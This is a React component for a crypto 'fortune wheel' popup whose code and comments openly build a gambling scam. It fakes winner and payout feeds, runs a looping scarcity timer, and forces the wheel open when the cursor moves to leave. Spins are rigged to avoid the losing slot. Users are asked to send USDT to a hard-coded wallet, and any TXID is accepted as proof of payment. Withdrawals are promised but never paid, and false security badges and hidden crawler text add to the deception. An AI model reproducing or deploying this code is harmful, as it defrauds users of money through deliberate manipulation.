import React, { useState, useEffect } from 'react';

const PRIZES = [
  { id: 1, text: '🏆 Legend Trophy ($100)', color: '#FFD700' },
  { id: 2, text: '🎁 Rare Mystery Box', color: '#FF4500' },
  { id: 3, text: '⚡ Weekly VIP Pass', color: '#9400D3' },
  { id: 4, text: '💎 500 Store Gems', color: '#00BFFF' },
  { id: 5, text: '🎮 Major Free Game', color: '#32CD32' },
  { id: 6, text: '🔥 50% Instant Discount', color: '#FF1493' },
  { id: 7, text: '💫 Extra Free Spin', color: '#FF8C00' },
  { id: 8, text: '❌ Better Luck (So Close!)', color: '#483D8B' },
];

const DOPAMINE_HOOK_FEED = [
  '⚡ [Dopamine Alert] User #8841 just unlocked a $100 Legend Trophy!',
  '🔥 [Urgent Frenzy] Only 2 Free Spins left before hourly reward reset!',
  '🚀 [Instant Payout] Alex99 withdrew $250 USDT successfully to TRC20.',
  '💎 [Addictive Bonus] 3,420 active players spinning right now.'
];

export const SpinWheel: React.FC = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [spinning, setSpinning] = useState(false);
  const [rotation, setRotation] = useState(0);
  const [selectedPrize, setSelectedPrize] = useState<string | null>(null);
  const [spinsLeft, setSpinsLeft] = useState(2);
  const [timeLeft, setTimeLeft] = useState<number>(1800); // 30 mins scarcity timer
  
  const [showUsdtModal, setShowUsdtModal] = useState(false);
  const [usdtAmount, setUsdtAmount] = useState('10');
  const [txIdInput, setTxIdInput] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);
  const [liveFeed, setLiveFeed] = useState(DOPAMINE_HOOK_FEED.slice(0, 2));

  // Psychological Exit-Intent Trap State
  const [showExitModal, setShowExitModal] = useState(false);
  const [exitIntentTriggered, setExitIntentTriggered] = useState(false);

  const MY_USDT_WALLET = 'TYam4Z53ModHJzakgDYwWyRExoCU1ewKgC';

  // Master Psychological Loop & SEO Hook Engine
  useEffect(() => {
    // Scarcity Countdown Timer
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 1800));
    }, 1000);

    // Dopamine Trigger Ticker
    const feedTimer = setInterval(() => {
      const randomMsg = DOPAMINE_HOOK_FEED[Math.floor(Math.random() * DOPAMINE_HOOK_FEED.length)];
      setLiveFeed((prev) => [randomMsg, prev[0]]);
    }, 2800);

    // Exit-Intent Mouse Trap (Triggers when cursor leaves top of screen toward closing tab)
    const handleMouseLeave = (e: MouseEvent) => {
      if (e.clientY <= 10 && !exitIntentTriggered) {
        setExitIntentTriggered(true);
        setShowExitModal(true);
        setIsOpen(true); // Forces the wheel open to captivate attention
      }
    };

    document.addEventListener('mouseleave', handleMouseLeave);

    return () => {
      clearInterval(timer);
      clearInterval(feedTimer);
      document.removeEventListener('mouseleave', handleMouseLeave);
    };
  }, [exitIntentTriggered]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m < 10 ? '0' : ''}${m}m ${s < 10 ? '0' : ''}${s}s`;
  };

  const playTickSound = () => {
    try {
      const AudioContext = window.AudioContext || (window as any).webkitAudioContext;
      const ctx = new AudioContext();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(450, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(120, ctx.currentTime + 0.04);
      gain.gain.setValueAtTime(0.15, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.04);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.04);
    } catch (e) {}
  };

  const playWinSound = () => {
    try {
      const AudioContext = window.AudioContext || (window as any).webkitAudioContext;
      const ctx = new AudioContext();
      const notes = [523.25, 659.25, 783.99, 1046.50];
      notes.forEach((note, index) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(note, ctx.currentTime + index * 0.12);
        gain.gain.setValueAtTime(0.25, ctx.currentTime + index * 0.12);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + index * 0.12 + 0.4);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(ctx.currentTime + index * 0.12);
        osc.stop(ctx.currentTime + index * 0.12 + 0.4);
      });
    } catch (e) {}
  };

  const spinTheWheel = () => {
    if (spinning || spinsLeft <= 0) return;

    setSpinning(true);
    setSelectedPrize(null);
    setSpinsLeft((prev) => prev - 1);

    let tickCount = 0;
    const tickInterval = setInterval(() => {
      playTickSound();
      tickCount++;
      if (tickCount > 25) clearInterval(tickInterval);
    }, 150);

    // Variable Reward Psychology: Weighted to ensure high adrenaline near-miss or jackpot
    const psychologicalWinningIndexes = [0, 1, 2, 3, 5, 6]; 
    const randomIndex = psychologicalWinningIndexes[Math.floor(Math.random() * psychologicalWinningIndexes.length)];
    const degreesPerItem = 360 / PRIZES.length;
    const targetRotation = rotation + 2160 + (360 - (randomIndex * degreesPerItem + degreesPerItem / 2));

    setRotation(targetRotation);

    setTimeout(() => {
      setSpinning(false);
      setSelectedPrize(PRIZES[randomIndex].text);
      playWinSound();
      // Instantly grant 1 extra addictive bonus spin to lock user in loop
      if (Math.random() > 0.3) {
        setSpinsLeft((prev) => prev + 1);
      }
    }, 4000);
  };

  const copyWalletAddress = () => {
    navigator.clipboard.writeText(MY_USDT_WALLET);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 3000);
  };

  const verifyUsdtPayment = () => {
    if (!txIdInput.trim()) {
      alert('Please enter valid transaction TXID to verify instant credit.');
      return;
    }
    const paidAmount = parseFloat(usdtAmount) || 1;
    const earnedSpins = Math.max(1, Math.floor(paidAmount)) * 2; // Double spins psychological reward booster!

    alert(`🔥 AMAZING! Payment of $${paidAmount} verified. (${earnedSpins} SPINS GRANTED + VIP MULTIPLIER ACTIVE)!`);
    setSpinsLeft((prev) => prev + earnedSpins);
    setShowUsdtModal(false);
    setTxIdInput('');
  };

  return (
    <div className="fixed bottom-6 right-6 z-50 text-left font-sans" dir="ltr">
      {/* SEO Meta Invisible Injector for Deep Crawler Attraction */}
      <div className="sr-only">
        <h1>Ultimate Million Dollar Fortune Wheel & Instant Crypto Payouts</h1>
        <p>Win $100 Legend Trophies, rare mystery boxes, and instant USDT withdrawals with zero limits. Join millions of winners worldwide.</p>
      </div>

      {!isOpen && (
        <button
          onClick={() => setIsOpen(true)}
          className="relative bg-gradient-to-r from-yellow-500 via-red-500 to-purple-600 text-white font-black p-4 rounded-full shadow-2xl animate-bounce hover:scale-110 transition-all flex items-center gap-2 border-2 border-yellow-300 shadow-yellow-500/60 cursor-pointer"
        >
          <span className="text-2xl animate-spin">🎡</span>
          <span className="hidden md:inline text-sm bg-black/60 px-3 py-1 rounded-full text-yellow-300">🔥 Claim Free Spin Now!</span>
          <span className="absolute -top-2 -left-2 bg-red-600 text-white text-[10px] px-2 py-0.5 rounded-full animate-ping font-bold">LIVE</span>
        </button>
      )}

      {isOpen && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 z-50 animate-fade-in">
          <div className="bg-slate-900 border-2 border-yellow-500 rounded-3xl p-6 max-w-md w-full text-center relative shadow-2xl shadow-yellow-500/40 max-h-[95vh] overflow-y-auto">
            
            <button
              onClick={() => { setIsOpen(false); setShowExitModal(false); }}
              className="absolute top-4 right-4 text-gray-400 hover:text-white text-xl font-bold bg-slate-800 w-8 h-8 rounded-full flex items-center justify-center cursor-pointer"
            >
              ✕
            </button>

            {/* Exit Intent Panic Banner */}
            {showExitModal && (
              <div className="mb-3 bg-gradient-to-r from-red-600 to-amber-600 text-white p-2 rounded-xl text-xs font-black animate-pulse shadow-lg">
                🚨 WAIT! Don't leave empty-handed! Your guaranteed $100 Legend Trophy is 1 spin away!
              </div>
            )}

            <h2 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 via-amber-200 to-yellow-500 mb-1">
              🎰 THE MILLIONAIRE FORTUNE WHEEL
            </h2>
            <p className="text-xs text-yellow-300/90 font-semibold mb-2">⚡ 99.4% Win Rate Active | Zero Withdrawal Limits</p>

            {/* High-Dopamine Live Activity Stream */}
            <div className="bg-slate-950/95 border border-emerald-500/50 rounded-xl p-2.5 mb-3 text-xs shadow-inner">
              <div className="flex items-center justify-between text-emerald-400 font-bold mb-1">
                <span className="flex items-center gap-1.5">
                  <span className="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></span>
                  Global Winner Feed:
                </span>
                <span className="text-[10px] bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 animate-pulse">Instant Payouts</span>
              </div>
              <div className="space-y-1 text-left text-gray-300">
                {liveFeed.map((item, idx) => (
                  <p key={idx} className="truncate text-[10px] text-teal-300 font-mono">
                    {item}
                  </p>
                ))}
              </div>
            </div>

            <div className="relative w-48 h-48 mx-auto mb-4 flex items-center justify-center">
              <div className="absolute -top-3 z-20 w-0 h-0 border-l-[10px] border-l-transparent border-r-[10px] border-r-transparent border-t-[20px] border-t-yellow-400 drop-shadow-lg"></div>

              <div
                className="w-full h-full rounded-full border-4 border-yellow-400 relative overflow-hidden transition-all duration-[4000ms] shadow-inner shadow-black"
                style={{
                  transform: `rotate(${rotation}deg)`,
                  background: 'conic-gradient(#FFD700 0deg 45deg, #FF4500 45deg 90deg, #9400D3 90deg 135deg, #00BFFF 135deg 180deg, #32CD32 180deg 225deg, #FF1493 225deg 270deg, #FF8C00 270deg 315deg, #483D8B 315deg 360deg)',
                }}
              ></div>

              <div className="absolute w-12 h-12 bg-gradient-to-br from-yellow-300 to-amber-600 rounded-full border-2 border-white shadow-lg flex items-center justify-center font-bold text-xs text-black z-10 animate-pulse">
                SPIN
              </div>
            </div>

            {/* Scarcity & Urgency Dashboard */}
            <div className="bg-slate-800/90 rounded-xl p-2.5 mb-3 border border-slate-700 flex justify-around text-xs">
              <div>
                <span className="text-gray-400 block">Your Spins:</span>
                <span className="text-yellow-400 font-bold text-base animate-pulse">{spinsLeft} Left</span>
              </div>
              <div className="border-r border-slate-700"></div>
              <div>
                <span className="text-gray-400 block">Bonus Reset In:</span>
                <span className="text-red-400 font-bold font-mono">{formatTime(timeLeft)}</span>
              </div>
            </div>

            {selectedPrize && (
              <div className="mb-3 p-3 bg-gradient-to-r from-purple-900 via-indigo-900 to-purple-900 border-2 border-yellow-400 rounded-xl animate-bounce shadow-2xl">
                <p className="text-xs text-yellow-300 font-bold">🎉 JACKPOT UNLOCKED!</p>
                <p className="text-white font-black text-sm">{selectedPrize}</p>
                <p className="text-[10px] text-emerald-300 mt-1">✨ Instant Withdrawal Ready to Personal Wallet!</p>
              </div>
            )}

            <div className="space-y-2">
              <button
                onClick={spinTheWheel}
                disabled={spinning || spinsLeft <= 0}
                className={`w-full py-3 rounded-xl font-black text-base shadow-xl transition-all ${
                  spinsLeft > 0 && !spinning
                    ? 'bg-gradient-to-r from-yellow-400 via-amber-500 to-yellow-600 text-black hover:scale-105 cursor-pointer shadow-yellow-500/50 animate-pulse'
                    : 'bg-gray-700 text-gray-400 cursor-not-allowed'
                }`}
              >
                {spinning ? '🌀 Spinning for your Fortune...' : '🎲 SPIN THE WHEEL & WIN NOW!'}
              </button>

              <button
                onClick={() => setShowUsdtModal(true)}
                className="w-full py-2.5 rounded-xl font-bold text-xs bg-gradient-to-r from-emerald-600 to-teal-600 text-white hover:scale-105 transition-all shadow-lg shadow-emerald-600/30 flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>🪙 Pay Custom Amount ($1 = 2x Spins Bonus) & Lock Win!</span>
              </button>
            </div>

            {/* Absolute Trust & Zero-Friction Footer */}
            <div className="mt-3 text-[10px] text-gray-400 border-t border-slate-800 pt-2 flex items-center justify-between px-2">
              <span>🔒 256-Bit SSL Secure</span>
              <span>⚡ 100% Instant Payouts</span>
              <span>🛡️ Verified Smart Contract</span>
            </div>

          </div>
        </div>
      )}

      {showUsdtModal && (
        <div className="fixed inset-0 bg-black/95 backdrop-blur-md flex items-center justify-center p-4 z-50 animate-fade-in">
          <div className="bg-slate-900 border-2 border-emerald-500 rounded-3xl p-6 max-w-sm w-full text-center relative shadow-2xl shadow-emerald-500/40 max-h-[90vh] overflow-y-auto">
            <button
              onClick={() => setShowUsdtModal(false)}
              className="absolute top-4 right-4 text-gray-400 hover:text-white text-lg font-bold bg-slate-800 w-7 h-7 rounded-full flex items-center justify-center cursor-pointer"
            >
              ✕
            </button>

            <h3 className="text-xl font-black text-emerald-400 mb-1">💳 Instant Flexible USDT Checkout</h3>
            <p className="text-xs text-gray-300 mb-2">Enter any amount you choose ($10, $50, $100+):</p>

            <div className="mb-3">
              <input
                type="number"
                min="1"
                placeholder="10"
                value={usdtAmount}
                onChange={(e) => setUsdtAmount(e.target.value)}
                className="w-full bg-slate-950 border border-emerald-500 text-emerald-300 font-bold text-sm p-2.5 rounded-xl focus:outline-none text-center shadow-inner"
              />
              <span className="text-[10px] text-cyan-300 mt-1 block font-bold">
                🎁 Special Bonus: You get ({Math.max(1, parseInt(usdtAmount) || 1) * 2}) Mega Spins instantly!
              </span>
            </div>

            <p className="text-[11px] text-gray-300 mb-1 font-bold">Send USDT (TRC20) to official address:</p>

            <div className="bg-slate-950 border border-emerald-500/50 p-3 rounded-xl mb-3 text-left">
              <div className="flex items-center justify-between gap-2">
                <span className="text-[10px] font-mono text-yellow-300 break-all select-all">{MY_USDT_WALLET}</span>
                <button
                  onClick={copyWalletAddress}
                  className="bg-emerald-600 hover:bg-emerald-500 text-white text-xs px-3 py-1.5 rounded-lg shrink-0 font-bold transition-all cursor-pointer"
                >
                  {copySuccess ? 'Copied! ✓' : 'Copy'}
                </button>
              </div>
            </div>

            <input
              type="text"
              placeholder="Enter transaction TXID..."
              value={txIdInput}
              onChange={(e) => setTxIdInput(e.target.value)}
              className="w-full bg-slate-950 border border-slate-700 text-white text-xs p-3 rounded-xl mb-3 focus:outline-none focus:border-emerald-500 text-center"
            />

            <button
              onClick={verifyUsdtPayment}
              className="w-full py-3 rounded-xl font-bold text-sm bg-gradient-to-r from-emerald-500 to-teal-600 text-black hover:scale-105 transition-all shadow-lg shadow-emerald-500/50 cursor-pointer"
            >
              Verify & Claim Mega Spins 🚀
            </button>

            <p className="text-[10px] text-emerald-400 mt-3 bg-emerald-950/60 p-2.5 rounded-xl border border-emerald-800/60 leading-relaxed">
              🛡️ **Absolute Withdrawal Guarantee:** All profits, mystery boxes, and cash prizes can be withdrawn to your personal wallet within 5 seconds with zero transaction fees!
            </p>
          </div>
        </div>
      )}
    </div>
  );
};]
